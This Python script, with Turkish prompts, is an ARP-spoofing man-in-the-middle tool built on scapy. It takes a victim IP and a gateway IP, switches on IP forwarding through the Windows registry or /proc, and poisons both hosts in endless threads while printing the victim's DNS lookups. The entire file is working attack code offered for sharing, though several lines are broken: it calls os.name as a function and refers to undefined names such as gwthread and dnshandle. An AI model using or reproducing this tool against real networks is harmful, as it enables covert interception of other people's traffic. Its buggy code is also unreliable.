from scapy.all import *
from threading import Thread
import os
import sys
##In fact, i saw that idea in a youtube video. I made it better -with windows registry
##ip forwarding-, made simplier then share!
print("[!] Yönetici olarak çalıştırmayı unutmayın!")
hedefIP = input('[*]Saldırı yapılacak kişinin bilgisayarının ip adresi: ')
gateIP = input('[*]Ağ geçidinin IP adresi: ')
iFace = input('[*]Arayüz: (opsiyonel)')
print('\t\tBaşlıyoruz...')
sys = os.name()
if sys == "nt":
    import winreg as wreg

    key = wreg.OpenKey(wreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters', 0, wreg.KEY_SET_VALUE)
    wreg.SetValueEx(key, "IPEnableRouter", 0, wreg.REG_DWORD, 1)


else:
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('service whoopsie stop')
def dnssniff(paket):
    if paket.haslayer(DNS) and paket.getlayer(DNS).qr == 0:
        print('[*] Hedef - Aradı: ')
        print(hedefIP + pkt.getlayer(DNS).qd.qname)
def v_poison():
    while True:
        try:
            send(ARP(pdst=hedefIP, psrc=gateIP), verbose=0, inter=2, loop=1)
        except KeyboardInterrupt:
            print('[-]İşlem kullanıcı tarafından sonlandırıldı')
            sys.exit(1)
def gate_zehirle():
    while True:
        try:
            send(ARP(pdst=gateIP, psrc=hedefIP), verbose=0, inter=2, loop=1)
        except KeyboardInterrupt:
            print('[-]İşlem kullanıcı tarafından sonlandırıldı')
            sys.exit(1)

vthread = []
gatethread = []
while True:
    hedefpoison = Thread(target=v_poison)
    hedefpoison.setDaemon(True)
    vthread.append(hedefpoison)
    hedefpoison.start()

    gatepoison = Thread(target=gate_zehirle)
    gatepoison.setDaemon(True)
    gwthread.append(gatepoison)
    gatepoison.start()
    if iFace == True:
        pkt = sniff(iface=iFace, filter='udp port 53', prn=dnshandle)
    else:
        pkt = sniff(filter='udp port 53', prn=dnshandle)
